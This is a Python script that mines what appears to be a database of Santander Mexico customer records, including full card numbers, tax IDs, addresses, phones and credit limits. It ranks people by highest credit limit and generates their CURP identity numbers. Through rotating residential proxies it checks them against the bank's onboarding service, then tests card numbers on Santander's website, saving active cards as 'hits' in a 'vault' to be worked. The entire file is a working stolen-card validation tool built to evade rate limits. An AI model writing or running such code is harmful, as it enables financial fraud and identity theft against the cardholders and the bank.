#!/usr/bin/env python3
"""
harvest_jalisco_hits.py — Cosechador Universal de Leads (>= 1969, Tarjeta + CP).
Prioriza mayores límites de crédito primero.
Arquitectura Desacoplada de Dos Fases:
  1. Productor Onboarding: Verificación masiva fluida con proxy residencial rotativo (10-20/min).
     Los prospectos elegibles caen a la cola intermedia 'santander_prepool'.
  2. Consumidor Santander Web: Verificación directa de tarjeta vía Playwright sin proxy desde IP local.
     Los confirmados se promueven a 'santander_hits' (card_verified=1).
Soporta pausa/reanudar desde UI de Santa Base vía purger_pause.flag y telemetría purger_status.json.
"""

import sys
import os
import time
import json
import asyncio
import sqlite3
import argparse
from datetime import datetime
from typing import Optional, List, Dict, Any

# Importar funciones de cálculo y validación
sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from migrate_santander import (
    split_fullname,
    infer_gender,
    extract_birthdate_from_rfc,
    generarCurp,
    CANONICAL_STATES
)
from santander_runner import check_single_curp, check_card_existence

# Asegurar codificación UTF-8 en Windows
for _stream in (sys.stdout, sys.stderr):
    if hasattr(_stream, "reconfigure"):
        try:
            _stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

DB_PATH = os.environ.get("SANTANDER_DB_PATH")
if not DB_PATH or not os.path.exists(DB_PATH):
    candidatas = [
        "/opt/apps/santander/data/santander.db",
        r"C:\Users\rober\Dropbox\TESTING DEV\data\santander.db",
        os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "data", "santander.db")),
    ]
    for c in candidatas:
        if os.path.exists(c):
            DB_PATH = c
            break
    if not DB_PATH:
        DB_PATH = candidatas[0]

STATUS_JSON_PATH = os.path.join(os.path.dirname(DB_PATH), "purger_status.json")
PAUSE_FLAG_PATH = os.path.join(os.path.dirname(DB_PATH), "purger_pause.flag")

def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=30.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode = WAL;")
    conn.execute("PRAGMA synchronous = NORMAL;")
    return conn

def init_prepool_schema(conn):
    """Crea la tabla de cola santander_prepool si no existe."""
    conn.execute("""
        CREATE TABLE IF NOT EXISTS santander_prepool (
            id INTEGER PRIMARY KEY,
            u6acct TEXT,
            curp TEXT,
            u6rfc TEXT,
            dmname TEXT,
            estado TEXT,
            ciudad TEXT,
            codigo_postal TEXT,
            u6licrea TEXT,
            fecha_nacimiento TEXT,
            genero TEXT,
            telefono TEXT,
            direccion TEXT,
            limit_num INTEGER,
            onboarding_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'PENDING'
        );
    """)
    conn.execute("CREATE INDEX IF NOT EXISTS idx_prepool_status ON santander_prepool(status);")
    conn.commit()

def is_eligible_age(fnac_str: str) -> bool:
    """Verifica nacidos estrictamente a partir de 1969 (<= 57 años en 2026) y mayores de 18 años."""
    if not fnac_str or len(fnac_str) < 4:
        return False
    try:
        birth_year = int(fnac_str[:4])
        return 1969 <= birth_year <= 2008
    except Exception:
        return False

def parse_credit_limit(raw_val: str) -> int:
    """Extrae el valor numérico entero del límite de crédito (ej. '$150,000' -> 150000)."""
    if not raw_val:
        return 0
    clean = str(raw_val).replace("$", "").replace(",", "").strip()
    try:
        return int(float(clean))
    except Exception:
        return 0

def write_telemetry(stats: dict):
    """Escribe telemetría atómica a purger_status.json para la UI de Santa Base."""
    try:
        payload = dict(stats)
        payload["updated_at"] = time.time()
        payload["timestamp_str"] = time.strftime("%Y-%m-%d %H:%M:%S")
        temp_file = STATUS_JSON_PATH + ".tmp"
        with open(temp_file, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2)
        os.replace(temp_file, STATUS_JSON_PATH)
    except Exception:
        pass

def count_unworked_hits(conn) -> int:
    """Cuenta cuántos hits ACTIVE están pendientes de trabajar en la bóveda."""
    try:
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM santander_hits WHERE work_status = 'ACTIVE'")
        return cur.fetchone()[0]
    except Exception:
        return 0

def count_pending_prepool(conn) -> int:
    """Cuenta cuántos prospectos están en espera de verificación de tarjeta."""
    try:
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM santander_prepool WHERE status = 'PENDING'")
        return cur.fetchone()[0]
    except Exception:
        return 0

async def card_verifier_consumer(conn, db_lock: asyncio.Lock, stats: dict, stop_event: asyncio.Event):
    """Consumidor Desacoplado: Verifica tarjetas en Santander Web directamente sin proxy a ritmo seguro."""
    print("[*] Consumidor de Verificación de Tarjeta (Santander Web Directo) iniciado.", flush=True)
    while not stop_event.is_set():
        if os.path.exists(PAUSE_FLAG_PATH):
            await asyncio.sleep(2.0)
            continue

        item = None
        async with db_lock:
            cur = conn.cursor()
            cur.execute("""
                SELECT id, u6acct, curp, u6rfc, dmname, estado, ciudad, codigo_postal,
                       u6licrea, fecha_nacimiento, genero, telefono, direccion, limit_num
                FROM santander_prepool
                WHERE status = 'PENDING'
                ORDER BY limit_num DESC
                LIMIT 1
            """)
            row = cur.fetchone()
            if row:
                item = dict(row)
                cur.execute("UPDATE santander_prepool SET status = 'VERIFYING' WHERE id = ?", (item["id"],))
                conn.commit()

        if not item:
            await asyncio.sleep(2.0)
            continue

        rid = item["id"]
        acct = item["u6acct"] or ""
        card_digits = "".join(c for c in acct if c.isdigit())
        card_tail = card_digits[-4:] if len(card_digits) >= 4 else "N/A"
        limit_str = item["u6licrea"]

        print(f"\n[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:{card_tail} para ID:{rid} (${item['limit_num']:,})...", end=" ", flush=True)

        if len(card_digits) < 16:
            async with db_lock:
                cur = conn.cursor()
                cur.execute("UPDATE santander_prepool SET status = 'DISCARDED' WHERE id = ?", (rid,))
                cur.execute("UPDATE santander_records SET results = 'OFF: tarjeta incompleta' WHERE id = ?", (rid,))
                conn.commit()
            print("[DISCARDED: Dígitos < 16]")
            await asyncio.sleep(2.0)
            continue

        # Validación directa Playwright (IP local, sin proxy)
        try:
            card_res = await asyncio.to_thread(check_card_existence, card_digits[:16])
        except Exception as cex:
            card_res = {"status": "ERROR", "detail": str(cex)[:60]}

        card_status = card_res.get("status", "ERROR")
        card_detail = card_res.get("detail", "")

        async with db_lock:
            cur = conn.cursor()
            if card_status == "ACTIVE":
                stats["hits"] += 1
                cur.execute("UPDATE santander_prepool SET status = 'APPROVED' WHERE id = ?", (rid,))
                cur.execute("""
                    INSERT OR REPLACE INTO santander_hits (
                        id, u6acct, curp, u6rfc, dmname, estado, ciudad, codigo_postal,
                        u6licrea, fecha_nacimiento, genero, telefono, direccion, work_status, card_verified, checked_at
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'ACTIVE', 1, CURRENT_TIMESTAMP)
                """, (
                    rid, acct, item["curp"], item["u6rfc"], item["dmname"], item["estado"],
                    item["ciudad"], item["codigo_postal"], limit_str, item["fecha_nacimiento"],
                    item["genero"], item["telefono"], item["direccion"]
                ))
                cur.execute("UPDATE santander_records SET results = 'ON: Tarjeta Activa Confirmada' WHERE id = ?", (rid,))
                conn.commit()
                print(f"[🟢 HIT #{stats['hits']}] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!", flush=True)
            elif card_status == "INACTIVE":
                stats["offs"] += 1
                cur.execute("UPDATE santander_prepool SET status = 'DISCARDED' WHERE id = ?", (rid,))
                cur.execute("UPDATE santander_records SET results = ? WHERE id = ?", (f"OFF: tarjeta inactiva ({card_detail})", rid))
                conn.commit()
                print(f"[🔴 CARD INACTIVE] ({card_detail})", flush=True)
            else:
                stats["retries"] += 1
                cur.execute("UPDATE santander_prepool SET status = 'ERROR' WHERE id = ?", (rid,))
                conn.commit()
                print(f"[⚠️ CARD RETRY] {card_detail} — conservado en cola", flush=True)

        write_telemetry(stats)
        await asyncio.sleep(3.5)

async def process_candidate(
    row: sqlite3.Row,
    conn: sqlite3.Connection,
    db_lock: asyncio.Lock,
    stats: dict,
    min_credito: int
):
    """Procesa un candidato individual en el Check 1 (Onboarding con Proxy Residencial)."""
    rid = row["id"]
    rfc = (row["u6rfc"] or "").strip().upper()
    name = (row["dmname"] or "").strip()
    acct = (row["u6acct"] or "").strip()
    cp = (row["dmzip"] or "").strip()
    city = (row["dmcity"] or "").strip()
    raw_estado = (row["u6estado"] or "").strip().upper()
    limit_raw = (row["u6licrea"] or "$0").strip()
    limit_num = parse_credit_limit(limit_raw)
    tel = (row["u6tel1"] or "").strip()
    addr = (row["dmaddr1"] or "").strip()

    if limit_num < min_credito:
        return

    fnac = extract_birthdate_from_rfc(rfc)
    if fnac and not is_eligible_age(fnac):
        async with db_lock:
            conn.execute("UPDATE santander_records SET results = 'OFF: edad no elegible (<1969)' WHERE id = ?", (rid,))
            conn.commit()
        return

    canon_entry = CANONICAL_STATES.get(raw_estado)
    estado_norm = canon_entry[0] if canon_entry else (raw_estado or "MEXICO")
    estado_code = canon_entry[1] if canon_entry else "NE"

    curp_val = (row["curp"] or "").strip().upper()
    gender = infer_gender(name)
    if not curp_val or len(curp_val) < 18:
        split = split_fullname(name)
        if split and split.get("ap1") and split.get("nombre") and gender and fnac and estado_code != "NE":
            calc = generarCurp(split["ap1"], split["ap2"], split["nombre"], fnac, gender, estado_code)
            if calc:
                curp_val = calc
                async with db_lock:
                    conn.execute(
                        "UPDATE santander_records SET curp = ?, fecha_nacimiento = ?, genero = ?, estado = ?, ciudad = ?, codigo_postal = ? WHERE id = ?",
                        (curp_val, fnac, gender, estado_norm, city, cp, rid)
                    )
                    conn.commit()

    if not curp_val or len(curp_val) < 18:
        return

    stats["total_processed"] += 1
    t0 = time.time()
    card_tail = acct[-4:] if len(acct) >= 4 else acct
    print(f"[{stats['total_processed']}] ID:{rid} | {curp_val} | ${limit_num:,} | {estado_norm[:12]} | T:{card_tail}...", end=" ", flush=True)

    # CHECK 1: ONBOARDING SANTANDER (VIA PROXY RESIDENCIAL ROTATIVO)
    try:
        res = await check_single_curp(curp_val, state=estado_norm)
    except Exception as ex:
        res = {"status": "RETRY", "detail": str(ex)[:60]}

    status = res.get("status", "ERROR")
    detail = res.get("detail", "")
    dur = time.time() - t0

    async with db_lock:
        cur = conn.cursor()
        if status == "ON":
            cur.execute("""
                INSERT OR REPLACE INTO santander_prepool (
                    id, u6acct, curp, u6rfc, dmname, estado, ciudad, codigo_postal,
                    u6licrea, fecha_nacimiento, genero, telefono, direccion, limit_num, status
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'PENDING')
            """, (rid, acct, curp_val, rfc, name, estado_norm, city, cp, limit_raw, fnac, gender, tel, addr, limit_num))
            cur.execute("UPDATE santander_records SET results = 'PREPOOL_ON: Elegible' WHERE id = ?", (rid,))
            conn.commit()
            print(f"[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta ({dur:.1f}s)", flush=True)
        elif status == "OFF":
            stats["offs"] += 1
            cur.execute("UPDATE santander_records SET results = ? WHERE id = ?", (f"OFF: {detail}", rid))
            conn.commit()
            print(f"[🔴 OFF] {detail} ({dur:.1f}s)", flush=True)
        else:
            stats["retries"] += 1
            cur.execute("UPDATE santander_records SET results = ? WHERE id = ?", (f"RETRY: {detail}", rid))
            conn.commit()
            print(f"[⚠️ {status}] {detail} ({dur:.1f}s)", flush=True)

    write_telemetry(stats)

async def harvest(
    target_hits: int = 100,
    max_checks: int = 5000,
    delay_sec: float = 0.2,
    min_credito: int = 50000,
    estados_filter: Optional[List[str]] = None,
    hits_pool_max: int = 15,
    hits_pool_resume: int = 10,
    daemon_mode: bool = False,
    concurrency: int = 2
):
    print("=" * 70)
    print(f"[*] SANTA BASE -- COSECHADOR DESACOPLADO CON PRE-POOL")
    print("=" * 70)
    print(f"BD: {DB_PATH}")
    ed_str = ", ".join(estados_filter) if estados_filter else "NACIONAL (TODOS LOS ESTADOS)"
    print(f"Estados: {ed_str}")
    print(f"Filtro de Crédito: Límite >= ${min_credito:,} (Prioridad: Límite Más Alto)")
    print(f"Filtro de Edad: Nacidos de 1969 en adelante (<= 57 años)")
    print(f"Concurrencia Onboarding: {concurrency} workers (Meta: 10-20 reg/min)")
    print(f"Bóveda Pool Cap: Pausa en {hits_pool_max} hits ACTIVE, Reanuda en {hits_pool_resume}")
    print("-" * 70)

    start_time = time.time()
    conn = get_db()
    init_prepool_schema(conn)
    db_lock = asyncio.Lock()

    stats = {
        "total_processed": 0,
        "hits": 0,
        "prepool_pending": count_pending_prepool(conn),
        "offs": 0,
        "retries": 0,
        "state": "BURST" if not os.path.exists(PAUSE_FLAG_PATH) else "PAUSED_MANUAL",
        "rate_per_min": 0.0,
        "active_workers": concurrency
    }
    write_telemetry(stats)

    stop_consumer_event = asyncio.Event()
    consumer_task = asyncio.create_task(card_verifier_consumer(conn, db_lock, stats, stop_consumer_event))

    try:
        while True:
            where_conds = [
                "LENGTH(TRIM(u6rfc)) = 13",
                "u6acct IS NOT NULL AND TRIM(u6acct) != ''",
                "dmzip IS NOT NULL AND TRIM(dmzip) != ''",
                "(results IS NULL OR results = '')",
                "(SUBSTR(u6rfc, 5, 2) >= '69' OR SUBSTR(u6rfc, 5, 2) <= '08')",
                "CAST(REPLACE(REPLACE(COALESCE(u6licrea, '0'), '$', ''), ',', '') AS INTEGER) >= ?"
            ]
            params: List[Any] = [min_credito]

            if estados_filter:
                placeholders = ",".join("?" for _ in estados_filter)
                where_conds.append(f"UPPER(u6estado) IN ({placeholders})")
                params.extend([e.upper() for e in estados_filter])

            sql = f"""
                SELECT id, u6acct, dmname, u6rfc, u6estado, dmcity, dmzip, u6tel1, dmaddr1, u6licrea, curp
                FROM santander_records
                WHERE {" AND ".join(where_conds)}
                ORDER BY CAST(REPLACE(REPLACE(COALESCE(u6licrea, '0'), '$', ''), ',', '') AS INTEGER) DESC
                LIMIT 500
            """

            async with db_lock:
                cur = conn.cursor()
                cur.execute(sql, params)
                candidates = cur.fetchall()

            print(f"\n[+] Lote de {len(candidates)} candidatos precargados con límite >= ${min_credito:,} (1969+)")

            if not candidates:
                print("[✓] No hay más candidatos pendientes en este segmento.")
                stats["state"] = "COMPLETED"
                write_telemetry(stats)
                if not daemon_mode:
                    break
                await asyncio.sleep(45.0)
                continue

            # Llenar la cola del lote
            queue = asyncio.Queue()
            for r in candidates:
                queue.put_nowait(r)

            async def onboarding_worker(w_id: int):
                while not queue.empty():
                    # 1. Pausa manual
                    while os.path.exists(PAUSE_FLAG_PATH):
                        if stats["state"] != "PAUSED_MANUAL":
                            stats["state"] = "PAUSED_MANUAL"
                            stats["rate_per_min"] = 0.0
                            write_telemetry(stats)
                        await asyncio.sleep(1.5)

                    # 2. Pool Cap
                    async with db_lock:
                        unworked = count_unworked_hits(conn)
                        stats["prepool_pending"] = count_pending_prepool(conn)
                    if unworked >= hits_pool_max:
                        if stats["state"] != "PAUSED_HITS_POOL":
                            stats["state"] = "PAUSED_HITS_POOL"
                            stats["rate_per_min"] = 0.0
                            write_telemetry(stats)
                            print(f"\n[⏸️] Pool de hits en {unworked} (>= {hits_pool_max}). Pausando onboarding para no quemar proxy.", flush=True)
                        while True:
                            await asyncio.sleep(6.0)
                            async with db_lock:
                                u_now = count_unworked_hits(conn)
                            if u_now <= hits_pool_resume:
                                break
                        print(f"[▶️] Pool de hits bajó a {u_now} (<= {hits_pool_resume}). Reanudando onboarding.", flush=True)

                    stats["state"] = "BURST"

                    if not daemon_mode:
                        if stats["hits"] >= target_hits or (max_checks and stats["total_processed"] >= max_checks):
                            break

                    try:
                        row = queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break

                    await process_candidate(row, conn, db_lock, stats, min_credito)
                    queue.task_done()

                    elapsed_m = (time.time() - start_time) / 60.0
                    if elapsed_m > 0.05:
                        stats["rate_per_min"] = round(stats["total_processed"] / elapsed_m, 1)

                    await asyncio.sleep(delay_sec)

            workers = [asyncio.create_task(onboarding_worker(i)) for i in range(concurrency)]
            await asyncio.gather(*workers)

            if not daemon_mode:
                if stats["hits"] >= target_hits or (max_checks and stats["total_processed"] >= max_checks):
                    break

    finally:
        stop_consumer_event.set()
        await consumer_task
        stats["state"] = "STOPPED"
        write_telemetry(stats)
        conn.close()

    print("\n" + "=" * 70)
    print(f"🏁 COSECHA FINALIZADA | Evaluados: {stats['total_processed']} | HITS Bóveda: {stats['hits']} | OFF: {stats['offs']}")
    print("=" * 70)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SantaBase — Cosechador Universal Desacoplado")
    parser.add_argument("--target-hits", type=int, default=50)
    parser.add_argument("--max-checks", type=int, default=5000)
    parser.add_argument("--delay", type=float, default=0.2)
    parser.add_argument("--min-credito", type=int, default=50000)
    parser.add_argument("--estados", type=str, default=None, help="Estados separados por coma (o omitir para nacional)")
    parser.add_argument("--daemon", action="store_true", help="Modo continuo desatendido")
    parser.add_argument("--concurrency", type=int, default=2, help="Workers concurrentes de Onboarding")
    args = parser.parse_args()

    ed_list = [e.strip() for e in args.estados.split(",") if e.strip()] if args.estados else None
    asyncio.run(harvest(
        target_hits=args.target_hits,
        max_checks=args.max_checks,
        delay_sec=args.delay,
        min_credito=args.min_credito,
        estados_filter=ed_list,
        daemon_mode=args.daemon,
        concurrency=args.concurrency
    ))
